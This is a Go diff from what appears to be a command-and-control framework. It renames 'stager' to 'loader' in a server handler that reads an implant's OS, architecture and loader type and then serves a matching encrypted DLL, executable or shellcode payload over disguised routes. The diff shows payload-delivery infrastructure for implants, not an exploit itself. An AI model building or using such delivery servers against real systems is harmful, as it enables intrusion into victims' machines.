@@ -41,7 +41,7 @@ type CheckInData struct {
 	AESIVBase64  string `json:"aesIV"`
 }
 
-type StagerData struct {
+type LoaderData struct {
 	OS           string `json:"os"`
 	Arch         string `json:"arch"`
 	Hostname     string `json:"hostname"`
@@ -533,7 +533,7 @@ func handleImplantWebSocket(ctx *gin.Context) {
 	}
 }
 
-func handleStagerDownload(lis *listener.Listener, serverState *state.ServerState) gin.HandlerFunc {
+func handleLoaderDownload(lis *listener.Listener, serverState *state.ServerState) gin.HandlerFunc {
 	fn := func(ctx *gin.Context) {
 		w := ctx.Writer
 		header := w.Header()
@@ -547,14 +547,14 @@ func handleStagerDownload(lis *listener.Listener, serverState *state.ServerState
 			return
 		}
 		// Parse JSON
-		var stgData StagerData
-		if err := json.Unmarshal(jsonBytes, &stgData); err != nil {
+		var ldrData LoaderData
+		if err := json.Unmarshal(jsonBytes, &ldrData); err != nil {
 			ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
 			return
 		}
 
 		// Generate AES key/iv
-		newAES, err := crypt.NewAESFromBase64Pairs(stgData.AESKeyBase64, stgData.AESIVBase64)
+		newAES, err := crypt.NewAESFromBase64Pairs(ldrData.AESKeyBase64, ldrData.AESIVBase64)
 		if err != nil {
 			ctx.String(http.StatusBadGateway, "Failed to generate AES instance from Base64 key/iv.")
 			return
@@ -572,44 +572,44 @@ func handleStagerDownload(lis *listener.Listener, serverState *state.ServerState
 		for _, payloadPath := range payloadPaths {
 			// TODO: more accurate check for file info
 
-			if stgData.OS == "linux" {
+			if ldrData.OS == "linux" {
 				// TODO
 				// ...
 			}
-			if stgData.OS == "windows" {
-				if stgData.LoaderType == "dll-loader" {
+			if ldrData.OS == "windows" {
+				if ldrData.LoaderType == "dll" {
 					// Load a DLL file.
-					if stgData.Arch == "amd64" {
+					if ldrData.Arch == "amd64" {
 						if strings.HasSuffix(payloadPath, ".amd64.dll") {
 							targetPayloadPath = payloadPath
 							break
 						}
-					} else if stgData.Arch == "i686" {
+					} else if ldrData.Arch == "i686" {
 						if strings.HasSuffix(payloadPath, ".i686.dll") {
 							targetPayloadPath = payloadPath
 							break
 						}
 					}
-				} else if stgData.LoaderType == "exec-loader" {
+				} else if ldrData.LoaderType == "exec" {
 					// Load an executable file.
-					if stgData.Arch == "amd64" {
+					if ldrData.Arch == "amd64" {
 						if strings.HasSuffix(payloadPath, ".amd64.exe") {
 							targetPayloadPath = payloadPath
 							break
 						}
-					} else if stgData.Arch == "i686" {
+					} else if ldrData.Arch == "i686" {
 						if strings.HasSuffix(payloadPath, ".i686.exe") {
 							targetPayloadPath = payloadPath
 							break
 						}
 					}
-				} else if stgData.LoaderType == "shellcode-loader" {
+				} else if ldrData.LoaderType == "shellcode" {
 					// Load a shellcode (raw) file.
-					if stgData.Arch == "amd64" {
+					if ldrData.Arch == "amd64" {
 						if strings.HasSuffix(payloadPath, ".x64.bin") {
 							targetPayloadPath = payloadPath
 						}
-					} else if stgData.Arch == "i686" {
+					} else if ldrData.Arch == "i686" {
 						if strings.HasSuffix(payloadPath, ".x86.bin") {
 							targetPayloadPath = payloadPath
 						}
@@ -693,8 +693,8 @@ func httpsRoutes(
 	for _, r := range fakeRoutes["/implant/websocket"] {
 		router.GET(r, handleImplantWebSocket)
 	}
-	for _, r := range fakeRoutes["/stager/download"] {
-		router.POST(r, handleStagerDownload(lis, serverState))
+	for _, r := range fakeRoutes["/loader/download"] {
+		router.POST(r, handleLoaderDownload(lis, serverState))
 	}
 	for _, r := range fakeRoutes["/socket/open"] {
 		router.POST(r, handleSocketOpen(serverState))
